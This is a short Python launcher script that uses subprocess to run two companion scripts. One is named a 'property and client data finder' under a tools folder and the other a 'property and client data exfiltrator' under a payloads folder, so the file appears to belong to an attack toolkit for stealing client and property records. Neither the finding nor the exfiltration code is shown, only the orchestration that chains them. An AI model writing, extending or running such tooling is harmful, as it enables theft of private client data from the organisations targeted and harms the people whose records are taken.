import subprocess
import os

def main():
    # Run the property and client data finder
    finder_path = os.path.join(os.path.dirname(__file__), "tools", "property_client_data_finder.py")
    subprocess.run(["python3", finder_path])

    # Run the property and client data exfiltrator
    exfiltrator_path = os.path.join(os.path.dirname(__file__), "payloads", "property_client_data_exfiltrator.py")
    subprocess.run(["python3", exfiltrator_path])

if __name__ == "__main__":
    main()
